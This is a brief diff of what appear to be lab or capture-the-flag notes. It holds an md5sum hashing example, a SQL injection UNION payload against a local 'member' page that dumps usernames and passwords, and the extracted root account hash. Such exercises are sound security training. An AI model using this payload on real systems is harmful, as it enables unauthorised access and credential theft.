@@ -1,0 +1,14 @@
+printf '%s' "my string" | md5sum
+
+
+a -> 0cc175b9c0f1b6a831c399e269772661
+aZ -> 73c1b5626b730f45c6cb3958e94b1266
+
+
+
+http://192.168.1.16/?page=member
+1 UNION SELECT id, username FROM Member_Brute_Force.db_default UNION SELECT id, password FROM Member_Brute_Force.db_default--
+
+id: 1
+username : root
+password : 3bf1114a986ba87ed28fc1b5884fc2f8
